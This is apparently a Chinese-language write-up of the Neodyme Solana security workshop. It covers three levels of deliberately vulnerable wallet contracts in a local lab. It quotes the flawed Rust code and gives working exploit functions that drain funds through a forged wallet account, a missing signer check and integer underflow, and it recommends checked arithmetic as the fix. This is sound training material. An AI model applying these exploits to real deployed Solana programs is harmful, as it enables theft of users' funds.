---
title: Neodyme：Solana Security Workshop
tags:
    - web3
    - blockchain
    - smart contract
    - solana
    - rust
---

## Setup - Full

```bash
$ docker run --name breakpoint-workshop -p 2222:22 -p 8383:80 -e PASSWORD="password" neodymelabs/breakpoint-workshop:latest-code-prebuilt
# visit http://localhost:8383
```

### Compiling the Contracts and Running the Exploits

- PoC 框架代码位于 `pocs` 目录下
- VSCode 中 `Ctrl+Shift+B` 再选择 `level`
- 或通过命令行的方式

    ```bash
    # compile all contracts
    cargo build-bpf --workspace

    # run level0 exploit
    RUST_BACKTRACE=1 cargo run --bin level0
    ```

### Exploit Outline

初始持有 1 SOL，目标是获得更多的 SOL

## Level 0 - A First Vulnerability

- 查看 `WalletInstruction`，初步了解程序的功能

    ```rs
    pub enum WalletInstruction {
        /// Initialize a Personal Savings Wallet
        ///
        /// Passed accounts:
        /// (1) Wallet account
        /// (2) Vault accounts
        /// (3) Authority
        /// (4) Rent sysvar
        /// (5) System program
        Initialize,
        /// Deposit
        ///
        /// Passed accounts:
        /// (1) Wallet account
        /// (2) Vault accounts
        /// (3) Money Source
        Deposit { amount: u64 },
        /// Withdraw from Wallet
        ///
        /// Passed accounts:
        /// (1) Wallet account
        /// (2) Vault accounts
        /// (3) Authority
        /// (4) Target Wallet account
        Withdraw { amount: u64 },
    }
    ```

- 程序入口点函数 `processor::process_instruction` 反序列化 `instruction_data` 并调用指定函数

    ```rs
    pub fn process_instruction(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        mut instruction_data: &[u8],
    ) -> ProgramResult {
        match WalletInstruction::deserialize(&mut instruction_data)? {
            WalletInstruction::Initialize => initialize(program_id, accounts),
            WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),
            WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),
        }
    }
    ```

- 调用其它程序可通过 `invoke()` 或 `invoke_signed()`（当需要 PDA 作为 instruction 的 signer 时）
- `withdraw` 中 `wallet`、`vault` 等账户均由调用者提供，且未检查账户 `wallet` 的 `owner`，因而可以创建一个攻击者作为 `authority` 的 `wallet` 账户，从而调用 `withdraw` 获取 SOL

    ```rs
    fn withdraw(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        let account_info_iter = &mut accounts.iter();
        let wallet_info = next_account_info(account_info_iter)?;
        let vault_info = next_account_info(account_info_iter)?;
        let authority_info = next_account_info(account_info_iter)?;
        let destination_info = next_account_info(account_info_iter)?;
        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

        assert!(authority_info.is_signer);
        assert_eq!(wallet.authority, *authority_info.key);
        assert_eq!(wallet.vault, *vault_info.key);

        if amount > **vault_info.lamports.borrow_mut() {
            return Err(ProgramError::InsufficientFunds);
        }

        **vault_info.lamports.borrow_mut() -= amount;
        **destination_info.lamports.borrow_mut() += amount;

        Ok(())
    }
    ```

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {

    // Step 0: how much money do we want to steal?
    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
    // `unwrap` returns a `panic` when it receives a `None`

    // Step 1: a fake wallet with the same vault
    let hacker_wallet = level0::Wallet {
        authority: challenge.hacker.pubkey(),
        vault: challenge.vault_address,
    };
    let fake_wallet = keypair(233);
    let mut hack_wallet_data: Vec<u8> = vec![];

    hacker_wallet.serialize(&mut hack_wallet_data).unwrap();
    
    env.create_account_with_data(&fake_wallet, hack_wallet_data);
    
    // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
    let instruction = Instruction {
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(fake_wallet.pubkey(), false),
            AccountMeta::new(challenge.vault_address, false),
            AccountMeta::new(challenge.hacker.pubkey(), true),
            AccountMeta::new(challenge.hacker.pubkey(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        // add `use borsh::BorshSerialize;` to use `try_to_vec()` method
        data: level0::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
    };
    env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
}
```

### 参考资料

- [Calling Between Programs | Solana Docs](https://docs.solana.com/developing/programming-model/calling-between-programs)
- [Environment in poc_framework - Rust](https://docs.rs/poc-framework/0.1.2/poc_framework/trait.Environment.html)
- [Option & unwrap - Rust By Example](https://doc.rust-lang.org/rust-by-example/error/option_unwrap.html)
- [Pubkey::find_program_address - Rust](https://docs.rs/solana-program/latest/solana_program/pubkey/struct.Pubkey.html#method.find_program_address)

## Level 1 - Personal Vault

- 相比于 Level 0，`Wallet` 移除了 `vault`，并保持了除 `vault` 外其它功能的一致性

    ```rs
    pub struct Wallet {
        pub authority: Pubkey,
    }
    ```

- `withdraw` 中 `wallet_info`、`authority_info` 仍然由调用者提供，且只检查 `wallet` 的 `owner` 是否为对应程序以及 `wallet` 中存储的 `authority` 与提供的 `authority_info` 是否匹配，并没有检查 `authority_info` 是否为 signer

    ```rs
    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        msg!("withdraw {}", amount);
        let account_info_iter = &mut accounts.iter();
        let wallet_info = next_account_info(account_info_iter)?;
        let authority_info = next_account_info(account_info_iter)?;
        let destination_info = next_account_info(account_info_iter)?;
        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

        assert_eq!(wallet_info.owner, program_id);
        assert_eq!(wallet.authority, *authority_info.key);

        if amount > **wallet_info.lamports.borrow_mut() {
            return Err(ProgramError::InsufficientFunds);
        }

        **wallet_info.lamports.borrow_mut() -= amount;
        **destination_info.lamports.borrow_mut() += amount;

        wallet
            .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
            .unwrap();

        Ok(())
    }
    ```

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let amount = env.get_account(challenge.wallet_address).unwrap().lamports;

    let instruction = Instruction {
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(challenge.wallet_address, false),
            AccountMeta::new(challenge.wallet_authority, false),
            AccountMeta::new(challenge.hacker.pubkey(), true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: level1::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
    };
    env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
}
```

## Level 2 - Secure Personal Vault

- 在 Level 1 的基础上，修复了 `withdraw` 未检查 signer 的问题

    ```rs
    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        msg!("withdraw {}", amount);
        let account_info_iter = &mut accounts.iter();
        let wallet_info = next_account_info(account_info_iter)?;
        let authority_info = next_account_info(account_info_iter)?;
        let destination_info = next_account_info(account_info_iter)?;
        let rent_info = next_account_info(account_info_iter)?;

        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;
        let rent = Rent::from_account_info(rent_info)?;

        assert_eq!(wallet_info.owner, program_id);
        assert_eq!(wallet.authority, *authority_info.key);
        assert!(authority_info.is_signer, "authority must sign!");

        let min_balance = rent.minimum_balance(WALLET_LEN as usize);
        if min_balance + amount > **wallet_info.lamports.borrow_mut() {
            return Err(ProgramError::InsufficientFunds);
        }

        **wallet_info.lamports.borrow_mut() -= amount;
        **destination_info.lamports.borrow_mut() += amount;

        wallet
            .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
            .unwrap();

        Ok(())
    }
    ```

- 在 `debug` 模式下编译程序，Rust 将对整型溢出抛出异常，而在 `release` 模式下，Rust 将进行 *two's complement wrapping*，以 `u8` 为例，结果等同于模 $256$
- 可以通过 `amount` 使 `wallet_info` 账户中的 `lamports` 下溢出来获取资金，并使 `destination_info` 账户中的 `lamports` 上溢出来减少其资金
    - 另外还需通过上溢出绕过检查 `min_balance + amount > **wallet_info.lamports.borrow_mut()`
- 推荐使用 `checked_sub`、`checked_add`

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    env.execute_as_transaction(&[level2::initialize(challenge.wallet_program, challenge.hacker.pubkey())], &[&challenge.hacker]).print_named("Hacker: initialize wallet");
    let hacker_wallet = level2::get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);

    let min_balance = Rent::default().minimum_balance(level2::WALLET_LEN as usize);
    let amount = u64::max_value() - min_balance + 1;

    for i in 0..10 {
        env.execute_as_transaction(&[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.wallet_address, false),
                AccountMeta::new_readonly(sysvar::rent::id(), false),
            ],
            data: level2::WalletInstruction::Withdraw { amount: amount + i }.try_to_vec().unwrap(),
        }], // 交易 `recent_blockhash` 相同，因而需要设置不同的参数，避免 This transaction has already been processed
        &[&challenge.hacker]).print_named(format!("Hacker: exploit {}", i).as_str());
    }
    
    env.execute_as_transaction(&[level2::withdraw(challenge.wallet_program, challenge.hacker.pubkey(), challenge.hacker.pubkey(), env.get_account(hacker_wallet).unwrap().lamports - min_balance)], &[&challenge.hacker]).print_named("Hacker: withdraw");
}
```

### 参考资料

- [Data Types - The Rust Programming Language](https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow)
- [anchor - How to avoid SendTransactionError "This transaction has already been processed" - Solana Stack Exchange](https://solana.stackexchange.com/a/1178)